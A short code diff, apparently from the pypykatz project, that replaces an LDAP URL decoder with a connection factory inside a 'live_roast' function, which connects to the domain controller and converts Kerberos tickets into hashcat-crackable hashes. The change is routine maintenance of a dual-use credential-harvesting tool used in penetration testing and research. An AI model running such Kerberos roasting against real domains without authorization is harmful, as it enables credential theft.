@@ -2,7 +2,7 @@
 import datetime
 
 from winacl.functions.highlevel import get_logon_info
-from msldap.commons.url import MSLDAPURLDecoder
+from msldap.commons.factory import LDAPConnectionFactory
 from pypykatz.kerberos.functiondefs.asn1structs import InitialContextToken
 from minikerberos.common.utils import TGSTicket2hashcat, TGTTicket2hashcat
 from minikerberos.network.clientsocket import KerberosClientSocket
@@ -291,7 +291,7 @@ async def live_roast(outfile = None):
 		logon = get_logon_info()
 		domain = logon['domain']
 		url = 'ldap+sspi-ntlm://%s' % logon['logonserver']
-		msldap_url = MSLDAPURLDecoder(url)
+		msldap_url = LDAPConnectionFactory.from_url(url)
 		client = msldap_url.get_client()
 		_, err = await client.connect()
 		if err is not None:
